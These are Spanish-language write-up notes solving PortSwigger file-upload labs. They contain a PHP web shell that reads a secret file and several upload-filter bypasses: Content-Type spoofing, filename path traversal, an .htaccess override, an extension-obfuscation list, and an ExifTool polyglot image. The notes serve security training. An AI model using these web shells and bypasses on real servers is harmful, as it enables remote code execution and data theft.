---
title: File Upload | PortSwigger
---
Labs de File upload de PowerSwigger hechos y explicado

#### Lab: Remote code execution via web shell upload

``` php
// metemos el siguiente codigo dentro de un archivo .php
<?php echo file_get_contents('/home/carlos/secret'); ?>
// Lo subimos, y luego accedemos a el mediante /files/avatars/shell.php
```
--------
#### Laboratorio: Ejecución remota de código mediante carga de shell web

```
// La pagina bloquea todo archivo que no sea del tipo image/jpeg, por lo que subimos el archivo .php, interceptamos la petición con burpsuite y cambiamos 
Content-Type: application/x-php 
// por
Content-Type: image/jpeg
```
----------
#### Laboratorio: Carga de shell web mediante elusión de la restricción Content-Type

```
// Podemos subir el archivo, pero no nos interpreta el comando, sino que nos lo devuelve por pantalla. Por lo tanto, vamos a subir el file aplicando un path traversal obfuscado: cambiamos el campo filename="shell.php" por filename="..%2fshell.php" y ya podemos acceder al archivo en /files/shell.php
```
-----------------
#### Laboratorio: Carga de Web Shell mediante path traversal

```
// Como podemos observar, no se pueden subir achivos .php, asi que vamos a modificar la configuración interna del servidor para que acepte dicho archivo en formato .shell. Como sabemos que estamos ante un Apache (ya que al subir una imagen por ejemplo, el response de la request nos lo indica), vamos a modificar su configuración para que acepte archivos.shell (php) Para ello, interceptamos la petición y realizamos los siguientes cambios:
// - cambiamos el filename por filename=".htaccess" --> Para modificar los tipos de archivos que acepta el directorio de la maquina /files/avatars. De esta manera, podemos subir .php
// -cambiamos el por "Content-Type text/plain" --> Es necesario para poder subir archivos .htaccess
// -modificamos el Payload del .php por "AddType application/x-httpd-php .shell" --> Los archivos .shell que le subamos serán interpretados como .php

// Una vez hemos realizado los siguientes cambios, volvemos a la request original y subimos el archivo shell.shell (que originalmente se llamaba shell.php) y si accedemos a /files/avatars/shell.shell ya podemos ver la contraseña para solucionar el lab.
```
------------
#### Laboratorio: Carga de shell web mediante elusión de la lista negra de extensiones

``` php
# Intentamos obfuscar el archivo .php como PNG usando el null byte: shell.php%00.png y ya podemos acceder a él.
# Otras maneras de obfuscar: 
- Añadir la extensión white-listeada: exploit.php.jpg
- Añadir punto final al archivo: exploit.php.
- URL-Encodear el punto: exploit%2Ephp
- Añadir ; al final: exploit.php;.png
- Null byte: exploit.php%00.png
- Usar otras alternativas al URL-encoder del punto: xC0 x2E, xC4 xAE, xC0, xAE
- Strip bypass -> si al subir el archivo .php nos borra la extensión php, podemos probar lo siguiente: exploit.p.phphp -> se borra .php -> queda: exploit.php
```
-----------
#### Laboratorio: Ejecución remota de código mediante carga de shell web políglota

``` php
# Vemos que solo podemos subir archivos de tipo imagen, que en sus metadatos contienen código que indiquen que es un .png
# Por lo tanto, vamos a usar ExifTool para camuflar código dentro de una imagen:
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <nuestro-archivo>.png -o polyglot.php
# Una vez lo tenemos, subimos la imagen y accedemos a su directorio desde la pagina web.
```